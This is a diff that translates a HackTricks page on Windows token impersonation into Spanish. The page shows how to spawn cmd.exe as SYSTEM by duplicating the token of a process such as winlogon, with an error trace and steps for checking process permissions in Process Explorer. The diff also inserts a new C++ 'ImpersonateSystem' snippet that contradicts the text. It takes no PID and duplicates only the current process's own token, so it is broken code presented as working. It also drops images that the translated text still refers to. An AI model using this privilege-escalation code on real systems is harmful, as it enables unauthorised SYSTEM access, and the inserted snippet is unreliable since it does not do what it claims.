@@ -1,32 +1,90 @@
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 
-## Code
+## Código
 
-The following code was copied from [here](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). It allows to **indicate a Process ID as argument** and a CMD **running as the user** of the indicated process will be run.\
-Running in a High Integrity process you can **indicate the PID of a process running as System** (like winlogon, wininit) and execute a cmd.exe as system.
-
+El siguiente código fue copiado de [aquí](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962).
+Permite **indicar un ID de proceso como argumento** y se ejecutará un CMD **ejecutándose como el usuario** del proceso indicado.\
+Ejecutándose en un proceso de alta integridad, se puede **indicar el PID de un proceso que se esté ejecutando como System** (como winlogon, wininit) y ejecutar un cmd.exe como System.
 ```cpp
 impersonateuser.exe 1234
 ```
-
 {% code title="impersonateuser.cpp" %}
+```cpp
+#include <windows.h>
+#include <stdio.h>
+
+BOOL ImpersonateSystem()
+{
+    HANDLE hToken;
+    BOOL result = FALSE;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+    {
+        TOKEN_PRIVILEGES tp;
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
+        {
+            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
+            {
+                HANDLE hNewToken;
+
+                if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
+                {
+                    PROCESS_INFORMATION pi;
+                    STARTUPINFO si;
+                    ZeroMemory(&si, sizeof(si));
+                    si.cb = sizeof(si);
+
+                    if (CreateProcessWithTokenW(hNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
+                    {
+                        result = TRUE;
+                        CloseHandle(pi.hProcess);
+                        CloseHandle(pi.hThread);
+                    }
+
+                    CloseHandle(hNewToken);
+                }
+            }
+        }
+
+        CloseHandle(hToken);
+    }
+
+    return result;
+}
+
+int main()
+{
+    if (ImpersonateSystem())
+    {
+        printf("Success!\n");
+    }
+    else
+    {
+        printf("Failed!\n");
+    }
+
+    return 0;
+}
+```
+{% endcode %}
 ```cpp
 #include <windows.h>
 #include <iostream>
@@ -159,8 +217,7 @@ int main(int argc, char** argv) {
 
 ## Error
 
-On some occasions you may try to impersonate System and it won't work showing an output like the following:
-
+En algunas ocasiones, puede intentar hacerse pasar por System y no funcionará, mostrando una salida como la siguiente:
 ```cpp
 [+] OpenProcess() success!
 [+] OpenProcessToken() success!
@@ -171,43 +228,19 @@ On some occasions you may try to impersonate System and it won't work showing an
 [-] CreateProcessWithTokenW Return Code: 0
 [-] CreateProcessWithTokenW Error: 1326
 ```
+Esto significa que incluso si estás ejecutando en un nivel de integridad alto, no tienes suficientes permisos. 
 
-This means that even if you are running on a High Integrity level **you don't have enough permissions**.\
-Let's check current Administrator permissions over `svchost.exe` processes with **processes explorer** (or you can also use process hacker):
+Veamos los permisos actuales del Administrador sobre los procesos `svchost.exe` con **Process Explorer** (o también puedes usar Process Hacker):
 
-1. Select a process of `svchost.exe`
-2. Right Click --> Properties
-3. Inside "Security" Tab click in the bottom right the button "Permissions"
-4. Click on "Advanced"
-5. Select "Administrators" and click on "Edit"
-6. Click on "Show advanced permissions"
+1. Selecciona un proceso de `svchost.exe`
+2. Haz clic derecho --> Propiedades
+3. Dentro de la pestaña "Seguridad", haz clic en el botón "Permisos" en la esquina inferior derecha
+4. Haz clic en "Avanzado"
+5. Selecciona "Administradores" y haz clic en "Editar"
+6. Haz clic en "Mostrar permisos avanzados"
 
-![](<../../.gitbook/assets/image (322).png>)
+La imagen anterior contiene todos los privilegios que "Administradores" tienen sobre el proceso seleccionado (como se puede ver en el caso de `svchost.exe`, solo tienen privilegios de "Consulta").
 
-The previous image contains all the privileges that "Administrators" have over the selected process (as you can see in case of `svchost.exe` they only have "Query" privileges)
+Mira los privilegios que "Administradores" tienen sobre `winlogon.exe`:
 
-See the privileges "Administrators" have over `winlogon.exe`:
-
-![](<../../.gitbook/assets/image (323).png>)
-
-Inside that process "Administrators" can "Read Memory" and "Read Permissions" which probably allows Administrators to impersonate the token used by this process.
-
-
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
-
-
+Dentro de ese proceso, "Administradores" pueden "Leer memoria" y "Leer permisos", lo que probablemente les permita suplantar el token utilizado por este proceso.
